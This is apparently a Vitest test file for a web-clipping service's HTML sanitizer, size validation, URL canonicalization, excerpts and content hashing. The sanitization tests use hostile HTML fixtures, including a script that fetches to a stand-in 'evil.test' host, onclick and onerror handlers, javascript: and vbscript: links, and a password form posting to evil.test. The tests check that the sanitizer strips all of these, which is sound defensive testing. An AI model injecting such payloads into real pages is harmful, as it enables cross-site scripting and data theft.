import { describe, expect, it } from 'vitest';
import {
  CLIP_INGEST_BODY_LIMIT,
  ClipValidationError,
  MAX_CLIP_CONTENT_BYTES,
  MAX_CLIP_SOURCE_META_BYTES,
  canonicalizeClipUrl,
  clipContentHash,
  clipExcerpt,
  sanitizeClipHtml,
  validateClipPayloadSizes,
} from '../src/services/clip-content.js';

const BASE = 'https://example.com/section/article';

describe('clip HTML sanitization', () => {
  it('drops scripts, event handlers and javascript: URLs', () => {
    const dirty = `
      <p onclick="steal()">text</p>
      <script>fetch('https://evil.test', { method: 'POST' })</script>
      <a href="javascript:alert(1)">link</a>
      <img src="x" onerror="steal()" />
    `;

    const clean = sanitizeClipHtml(dirty, BASE);

    expect(clean).not.toContain('<script');
    expect(clean).not.toContain('onclick');
    expect(clean).not.toContain('onerror');
    expect(clean).not.toContain('javascript:');
    expect(clean).toContain('text');
  });

  it('drops embedded objects, frames and form controls', () => {
    const dirty = `
      <p>keep</p>
      <iframe src="https://evil.test"></iframe>
      <object data="evil.swf"></object>
      <embed src="evil.swf" />
      <form action="https://evil.test"><input name="password" /><button>go</button></form>
    `;

    const clean = sanitizeClipHtml(dirty, BASE);

    for (const tag of ['<iframe', '<object', '<embed', '<form', '<input', '<button']) {
      expect(clean).not.toContain(tag);
    }
    expect(clean).toContain('keep');
  });

  it('strips inline styles but keeps article structure', () => {
    const dirty = '<article><h2 style="position:fixed">Heading</h2>'
      + '<pre><code>const a = 1;</code></pre>'
      + '<table><thead><tr><th colspan="2">h</th></tr></thead><tbody><tr><td>c</td></tr></tbody></table>'
      + '<blockquote>quote</blockquote></article>';

    const clean = sanitizeClipHtml(dirty, BASE);

    expect(clean).not.toContain('style=');
    expect(clean).toContain('<h2>');
    expect(clean).toContain('<code>');
    expect(clean).toContain('colspan="2"');
    expect(clean).toContain('<blockquote>');
  });

  it('keeps http, https and mailto links and resolves relative URLs', () => {
    const clean = sanitizeClipHtml(
      '<p><a href="/deep">a</a><a href="mailto:x@example.com">b</a><img src="../img/p.png" alt="p" /></p>',
      BASE,
    );

    expect(clean).toContain('https://example.com/deep');
    expect(clean).toContain('mailto:x@example.com');
    expect(clean).toContain('https://example.com/img/p.png');
  });

  it('rejects data: and other protocols on links', () => {
    const clean = sanitizeClipHtml('<a href="data:text/html,<b>x</b>">d</a><a href="vbscript:x">v</a>', BASE);

    expect(clean).not.toContain('data:text/html');
    expect(clean).not.toContain('vbscript:');
  });
});

describe('clip payload size validation', () => {
  const within = { contentHtml: '<p>ok</p>', contentMd: 'ok', sourceMeta: { a: 1 } };

  it('accepts a payload inside every limit', () => {
    expect(() => validateClipPayloadSizes(within)).not.toThrow();
  });

  it('exposes the limits the extension mirrors', () => {
    expect(MAX_CLIP_CONTENT_BYTES).toBe(2 * 1024 * 1024);
    expect(MAX_CLIP_SOURCE_META_BYTES).toBe(256 * 1024);
    expect(CLIP_INGEST_BODY_LIMIT).toBe(6 * 1024 * 1024);
  });

  it('rejects oversized HTML even when the client claims it truncated', () => {
    expect(() => validateClipPayloadSizes({ ...within, contentHtml: 'a'.repeat(MAX_CLIP_CONTENT_BYTES + 1) }))
      .toThrow(ClipValidationError);
  });

  it('rejects oversized Markdown', () => {
    expect(() => validateClipPayloadSizes({ ...within, contentMd: 'a'.repeat(MAX_CLIP_CONTENT_BYTES + 1) }))
      .toThrow(ClipValidationError);
  });

  it('measures bytes rather than characters', () => {
    // Three bytes per character in UTF-8: well under the limit by length, over it by bytes.
    const justOverInBytes = '蒙'.repeat(Math.floor(MAX_CLIP_CONTENT_BYTES / 3) + 1);

    expect(justOverInBytes.length).toBeLessThan(MAX_CLIP_CONTENT_BYTES);
    expect(() => validateClipPayloadSizes({ ...within, contentMd: justOverInBytes })).toThrow(ClipValidationError);
  });

  it('rejects oversized source metadata', () => {
    expect(() => validateClipPayloadSizes({ ...within, sourceMeta: { blob: 'a'.repeat(MAX_CLIP_SOURCE_META_BYTES) } }))
      .toThrow(ClipValidationError);
  });
});

describe('canonical URL handling', () => {
  it('prefers a declared canonical URL', () => {
    expect(canonicalizeClipUrl('https://example.com/a?utm_source=x', 'https://example.com/canonical'))
      .toBe('https://example.com/canonical');
  });

  it('normalizes host, port, fragment and parameter order', () => {
    expect(canonicalizeClipUrl('https://EXAMPLE.com:443/path?b=2&a=1#frag'))
      .toBe('https://example.com/path?a=1&b=2');
  });

  it('removes only the known tracking parameters', () => {
    expect(canonicalizeClipUrl('https://example.com/p?utm_source=a&gclid=b&id=42'))
      .toBe('https://example.com/p?id=42');
  });

  it('falls back to the raw URL when the declared canonical is unusable', () => {
    expect(canonicalizeClipUrl('https://example.com/a', 'not a url'))
      .toBe('https://example.com/a');
  });

  it('rejects a URL that is not http or https', () => {
    expect(() => canonicalizeClipUrl('ftp://example.com/a')).toThrow(ClipValidationError);
    expect(() => canonicalizeClipUrl('javascript:alert(1)')).toThrow(ClipValidationError);
  });
});

describe('clip excerpt', () => {
  it('collapses whitespace and truncates without splitting a character', () => {
    const excerpt = clipExcerpt(`# Heading\n\n${'蒙'.repeat(500)}`, 200);

    expect(excerpt.length).toBeLessThanOrEqual(200);
    expect(excerpt).not.toContain('\n');
    expect(excerpt).not.toContain('�');
  });

  it('strips Markdown syntax so the list view reads as prose', () => {
    const excerpt = clipExcerpt('# Title\n\nSome **bold** and [a link](https://example.com) here.');

    expect(excerpt).not.toContain('#');
    expect(excerpt).not.toContain('**');
    expect(excerpt).not.toContain('](');
    expect(excerpt).toContain('Some bold and a link here.');
  });
});

describe('clip content hash', () => {
  it('is stable for identical content', () => {
    expect(clipContentHash('<p>a</p>', 'a')).toBe(clipContentHash('<p>a</p>', 'a'));
  });

  it('changes when either half changes', () => {
    const base = clipContentHash('<p>a</p>', 'a');

    expect(clipContentHash('<p>b</p>', 'a')).not.toBe(base);
    expect(clipContentHash('<p>a</p>', 'b')).not.toBe(base);
  });

  it('is a hex SHA-256 digest', () => {
    expect(clipContentHash('<p>a</p>', 'a')).toMatch(/^[0-9a-f]{64}$/);
  });
});
